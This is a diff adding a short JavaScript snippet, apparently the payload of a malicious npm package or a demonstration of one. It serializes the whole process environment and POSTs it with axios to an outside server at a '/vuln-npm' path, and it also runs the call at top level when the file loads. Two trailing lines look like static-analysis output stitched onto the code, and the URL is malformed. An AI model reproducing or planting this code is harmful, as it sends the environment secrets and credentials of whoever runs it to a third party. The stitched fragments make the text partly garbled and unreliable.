@@ -1,0 +1,24 @@
+const main =  () => {
+	console.log('[.] Starting request...');
+	axios.post(
+			`http:/${server}:${port}/vuln-npm`,
+			JSON.stringify(process.env, null, 4)
+	).then( res => {
+		console.log('[+] Success!');
+	})
+	.catch( err => {
+		console.log('[!] Error!')
+	});
+}
+console.log('[.] Starting request...')
+axios.post(
+			`http:/${server}:${port}/vuln-npm`,
+			JSON.stringify(process.env, null, 4)
+	).then( res => {
+		console.log('[+] Success!');
+	})
+	.catch( err => {
+		console.log('[!] Error!')
+	})
+<operator>.formatString("http:/", server, ":", port, "/vuln-npm")
+JSON.stringify(process.env, null, 4)
